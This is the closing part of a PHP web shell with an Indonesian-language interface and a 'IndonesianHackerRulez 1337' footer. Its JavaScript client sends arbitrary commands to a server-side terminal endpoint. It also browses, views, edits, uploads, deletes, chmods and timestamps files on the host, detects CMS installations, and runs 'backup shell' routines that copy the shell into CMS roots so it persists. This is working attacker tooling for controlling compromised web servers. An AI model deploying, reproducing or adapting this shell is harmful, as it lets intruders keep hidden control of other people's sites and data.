            } else {
                echo "❓ CMS tidak dikenali — tidak ada aksi yang dilakukan.\n";
            }

            echo "</div>";
        } ?>

      </div>
    </div>

    <div class="footer">Note: IndonesianHackerRulez <code>1337</code>.</div>
  </div>

<script>
const token = '<?php echo $_SESSION["fm_token"]; ?>';
const term = document.getElementById('terminal');
const cmdInput = document.getElementById('cmd');
const fileTableBody = document.querySelector('#fileTable tbody');
const details = document.getElementById('details');
const dirInput = document.getElementById('dirInput');
const manualCdInput = document.getElementById('manualCd');
const uploadFileInput = document.getElementById('uploadFile');
const backupOut = document.getElementById('backupOut');
const termForm = document.getElementById('termForm');
const termCmd  = document.getElementById('termCmd');
const termOut  = document.getElementById('termOut');

termForm.addEventListener('submit', async e => {
  e.preventDefault();
  const cmd = termCmd.value.trim();
  if (!cmd) return;
  termOut.innerHTML += "> " + cmd + "\n";
  const res = await fetch("", {
    method: "POST",
    body: new URLSearchParams({ ajax: "terminal", cmd })
  });
  const data = await res.json();
  termOut.innerHTML += (data.output || data.msg) + "\n";
  termCmd.value = "";
  termOut.scrollTop = termOut.scrollHeight;
});

function appendTerm(t){ term.innerText += "\\n"+t; term.scrollTop = term.scrollHeight; }
function clearTerm(){ term.innerText = ''; }

function ajax(data, cb){
  const form = new URLSearchParams();
  for (const k in data) form.append(k, data[k]);
  fetch(location.href, {method:'POST', body: form}).then(r=>r.json()).then(d=>cb(d)).catch(e=>appendTerm('Kesalahan AJAX: '+e));
}

function requireCSRF(form){
  form.append('csrf', token);
}

// Run command typed
function runCmd(cmd){
  cmd = cmd || cmdInput.value.trim();
  if(!cmd) return;
  appendTerm('> '+cmd);
  cmdInput.value='';
  const parts = cmd.split(/\s+/);
  const c = parts[0].toLowerCase();
  if (c === 'clear'){ clearTerm(); return; }
  if (c === 'ls'){ listDir(parts[1]||'.'); return; }
  if (c === 'pwd'){ fetch(location.href+'?internal_get_cwd=1').then(r=>r.text()).then(t=>appendTerm('PWD: '+(t||'.'))); return; }
  if (c === 'cd'){ manualCd(parts[1]||'.'); return; }
  if (c === 'cd..' || (c==='cd' && parts[1]==='..')){ goUp(); return; }
  if (c === 'cat'){ ajax({ajax:'view', file:parts[1]||''}, d=>{ if(!d.ok) appendTerm('KESALAHAN: '+d.msg); else appendTerm(d.content); }); return; }
  if (c === 'info'){ showInfo(); return; }
  if (c === 'detect_cms'){ ajax({ajax:'detect_cms', dir: dirInput.value||'.'}, d=>{ if(!d.ok) appendTerm('KESALAHAN: '+d.msg); else appendTerm('CMS roots:\\n'+JSON.stringify(d.roots,null,2)); }); return; }
  if (c === 'backup'){ if (parts[1] && parts[1]==='detect'){ ajax({ajax:'backup_quick'}, d=>{ appendTerm('Hasil backup shell:\\n'+JSON.stringify(d,null,2)); backupOut.innerText = JSON.stringify(d); }); } else { ajax({ajax:'backup', target: parts[1] || dirInput.value || '.' , csrf: token}, d=>{ appendTerm('Hasil backup:\\n'+JSON.stringify(d,null,2)); backupOut.innerText = JSON.stringify(d); }); } return; }
  if (c === 'backup_quick'){ ajax({ajax:'backup_quick', csrf: token}, d=>{ appendTerm('Hasil backup shell:\\n'+JSON.stringify(d,null,2)); backupOut.innerText = JSON.stringify(d); }); return; }
  appendTerm('Perintah tidak diketahui: '+cmd);
}
cmdInput.addEventListener('keydown', e=>{ if(e.key==='Enter') runCmd(); });

// list directory
function listDir(dir){
  dir = dir || dirInput.value || '.';
  ajax({ajax:'list', dir:dir, csrf: token}, d=>{
    if (!d.ok) return appendTerm('Kesalahan daftar: '+d.msg);
    appendTerm('Terdaftar '+d.cwd);
    if (d.breadcrumb) renderBreadcrumb(d.breadcrumb);
    fileTableBody.innerHTML = '';
    d.items.forEach(it=>{
      const tr = document.createElement('tr');
      const nameTd = document.createElement('td');
      if (it.is_dir){
        const a = document.createElement('span'); a.textContent = '📁 '+it.name; a.className='linklike';
        a.onclick = ()=>{ dirInput.value = (d.cwd==='.'? it.name : d.cwd + '/' + it.name); listDir(dirInput.value); };
        nameTd.appendChild(a);
      } else {
        const a = document.createElement('span'); a.textContent = '📄 '+it.name; a.className='linklike';
        a.onclick = ()=>{ viewFile((d.cwd==='.'? it.name : d.cwd + '/' + it.name)); };
        nameTd.appendChild(a);
      }
      tr.appendChild(nameTd);
      const permsTd = document.createElement('td'); permsTd.textContent = it.perms||'';
      const ownerTd = document.createElement('td'); ownerTd.textContent = (it.owner||'') + '/' + (it.group||'');
      const sizeTd = document.createElement('td'); sizeTd.textContent = it.size?it.size:'-';
      const mtd = document.createElement('td'); mtd.textContent = it.mtime?new Date(it.mtime*1000).toLocaleString():'-';
      tr.appendChild(permsTd); tr.appendChild(ownerTd); tr.appendChild(sizeTd); tr.appendChild(mtd);
      const actionsTd = document.createElement('td');
      const rel = (d.cwd==='.'? it.name : d.cwd + '/' + it.name);
      if (!it.is_dir){
        actionsTd.innerHTML = `<div class="file-actions">
          <button class="btn" onclick="viewFile('${rel}')">View</button>
          <button class="btn" onclick="editFile('${rel}')">Edit</button>
          <button class="btn" onclick="renamePrompt('${rel}')">Rename</button>
          <button class="btn" onclick="chmodPrompt('${rel}')">Chmod</button>
          <button class="btn" onclick="touchPrompt('${rel}')">Touch</button>
          <button class="btn" onclick="deletePath('${rel}')">Hapus</button>
          <button class="btn" onclick="downloadFile('${rel}')">Unduh</button>
        </div>`;
      } else {
        actionsTd.innerHTML = `<div class="file-actions">
          <button class="btn" onclick="renamePrompt('${rel}')">Rename</button>
          <button class="btn" onclick="chmodPrompt('${rel}')">Chmod</button>
          <button class="btn" onclick="deletePath('${rel}')">Hapus</button>
        </div>`;
      }
      tr.appendChild(actionsTd);
      fileTableBody.appendChild(tr);
    });
  });
}

// view file
function viewFile(rel){
  appendTerm('Melihat '+rel);
  ajax({ajax:'view', file:rel, csrf: token}, d=>{ if(!d.ok) return appendTerm('Kesalahan melihat: '+d.msg); // show in a modal-like details area
    const pre = '-----\\n' + d.content + '\\n-----';
    appendTerm(pre);
  });
}

// edit file
function editFile(rel){
  appendTerm('Mengubah '+rel);
  ajax({ajax:'view', file:rel, csrf: token}, d=>{ if(!d.ok) return appendTerm('Kesalahan ubah: '+d.msg);
    const newc = prompt('Ubah file: '+rel, d.content);
    if (newc === null) return appendTerm('Batal mengubah');
    fetch(location.href, {method:'POST', body: new URLSearchParams({ajax:'save_file', file:rel, data:newc, csrf:token})})
      .then(r=>r.json()).then(res=>{ appendTerm(res.ok?res.msg:'Gagal disimpan: '+res.msg); if(res.ok) listDir(dirInput.value||'.'); });
  });
}

// rename prompt
function renamePrompt(rel){
  const to = prompt('Nama baru (includex ekstensi):', '');
  if (!to) return;
  appendTerm('Mengganti '+rel+' -> '+to);
  fetch(location.href, {method:'POST', body: new URLSearchParams({ajax:'rename', from:rel, to:to, csrf:token})}).then(r=>r.json()).then(d=>{ appendTerm(d.ok?d.msg:'Gagal ganti nama: '+d.msg); if (d.ok) listDir(dirInput.value||'.'); });
}

// chmod prompt
function chmodPrompt(rel){
  const m = prompt('Mode (e.g. 0644):','0644');
  if (!m) return;
  appendTerm('chmod '+m+' '+rel);
  fetch(location.href,{method:'POST', body: new URLSearchParams({ajax:'chmod', file:rel, mode:m, csrf:token})}).then(r=>r.json()).then(d=>{ appendTerm(d.ok?d.msg:'chmod gagal: '+d.msg); if (d.ok) listDir(dirInput.value||'.'); });
}

// touch prompt
function touchPrompt(rel){
  const t = prompt('Stempel waktu Unix (kosongkan untuk saat ini):','');
  appendTerm('touch '+rel);
  fetch(location.href,{method:'POST', body: new URLSearchParams({ajax:'touch', file:rel, time:t, csrf:token})}).then(r=>r.json()).then(d=>{ appendTerm(d.ok?d.msg:'touch gagal: '+d.msg); if (d.ok) listDir(dirInput.value||'.'); });
}

// delete
function deletePath(rel){
  if (!confirm('Hapus '+rel+' ? Ini secara permanen.')) return;
  appendTerm('Menghapus '+rel);
  fetch(location.href,{method:'POST', body: new URLSearchParams({ajax:'delete', path:rel, csrf:token})}).then(r=>r.json()).then(d=>{ appendTerm(d.ok?d.msg:'Gagal dihapus: '+d.msg); if (d.ok) listDir(dirInput.value||'.'); });
}

// download
function downloadFile(rel){
  appendTerm('Mengunduh '+rel);
  const form = new URLSearchParams({ajax:'download', file:rel, csrf:token});
  fetch(location.href, {method:'POST', body: form}).then(r=>r.blob()).then(blob=>{ const url=URL.createObjectURL(blob); const a=document.createElement('a'); a.href=url; a.download=rel.split('/').pop(); document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url); });
}

// upload
function doUpload(){
  const fileInput = uploadFileInput;
  if (!fileInput.files || !fileInput.files[0]) return alert('Select a file');
  const form = new FormData();
  form.append('ajax','upload'); form.append('dest', dirInput.value || '.'); form.append('csrf', token);
  form.append('upload', fileInput.files[0]);
  fetch(location.href, {method:'POST', body: form}).then(r=>r.json()).then(d=>{ if(!d.ok) appendTerm('Upload gagal: '+d.msg); else { appendTerm('Terupload: '+d.path); listDir(dirInput.value||'.'); } });
}

// create file
function createFilePrompt(){
  const name = prompt('Nama file baru (eg: support.php):','');
  if (!name) return;
  fetch(location.href, {method:'POST', body: new URLSearchParams({ajax:'mkfile', dir: dirInput.value||'.', name:name, csrf: token})}).then(r=>r.json()).then(d=>{ appendTerm(d.ok?d.msg:'Gagal dibuat: '+d.msg); if (d.ok) listDir(dirInput.value||'.'); });
}

// create folder
function createFolderPrompt(){
  const name = prompt('Nama folder baru:','');
  if (!name) return;
  fetch(location.href, {method:'POST', body: new URLSearchParams({ajax:'mkdir', dir: dirInput.value||'.', name:name, csrf: token})}).then(r=>r.json()).then(d=>{ appendTerm(d.ok?d.msg:'Gagal dibuat: '+d.msg); if (d.ok) listDir(dirInput.value||'.'); });
}

// manual cd
function manualCd(p){
  const target = p || manualCdInput.value || '.';
  // support .. explicitly
  if (target === '..'){ goUp(); return; }
  dirInput.value = target;
  listDir(dirInput.value || '.');
}

// go up
function goUp(){
  const cur = dirInput.value || '.';
  let parts = cur.split('/');
  if (parts.length <= 1 || (parts.length===2 && parts[0]==='.') ) { dirInput.value = '.'; listDir('.'); return; }
  parts.pop();
  dirInput.value = parts.join('/') || '.';
  listDir(dirInput.value);
}

// quick backup (all targets)
function doQuickBackup(){
  appendTerm('Backup Shell Sedang Berjalan Kawanku...');
  fetch(location.href, {method:'POST', body: new URLSearchParams({ajax:'backup_quick', csrf: token})}).then(r=>r.json()).then(d=>{ appendTerm('Hasil backup shell:\\n'+JSON.stringify(d,null,2)); backupOut.innerText = JSON.stringify(d); });
}

// backup single target (by folder)
function doBackupTarget(path){
  appendTerm('Backup Shell Target Root Kawanku: '+path);
  fetch(location.href, {method:'POST', body: new URLSearchParams({ajax:'backup', target: path, csrf: token})}).then(r=>r.json()).then(d=>{ appendTerm('Hasil backup:\\n'+JSON.stringify(d,null,2)); backupOut.innerText = JSON.stringify(d); });
}

// show info
function showInfo(){
  appendTerm('Mengambil informasi kawanku...');
  ajax({ajax:'info', csrf: token}, d=>{ if(!d.ok) appendTerm('Info kesalahan: '+d.msg); else appendTerm('Info:\\n'+JSON.stringify(d.out,null,2)); });
}

function renderBreadcrumb(bc) {
  const el = document.getElementById('breadcrumb');
  el.innerHTML = ''; // kosongkan

  if (!bc || bc.length === 0) {
    const root = document.createElement('span');
    root.textContent = '/';
    root.className = 'path-item';
    root.onclick = () => listDir('/');
    el.appendChild(root);
    return;
  }

  // tombol root
  const root = document.createElement('span');
  root.textContent = '/';
  root.className = 'path-item';
  root.onclick = () => listDir('/');
  el.appendChild(root);

  bc.forEach((b, i) => {
    const sep = document.createTextNode(' / ');
    el.appendChild(sep);

    const span = document.createElement('span');
    span.textContent = b.name;
    span.className = 'path-item';
    span.onclick = () => listDir(b.path);
    el.appendChild(span);
  });
}

// initial
dirInput.value='.';
listDir('.');
fetch(location.href+'?internal_get_cwd=1').then(r=>r.text()).then(t=>{ /* ignore */ });
renderBreadcrumb(resp.breadcrumb);
</script>

<?php endif; ?>
</div>
</body>
</html>
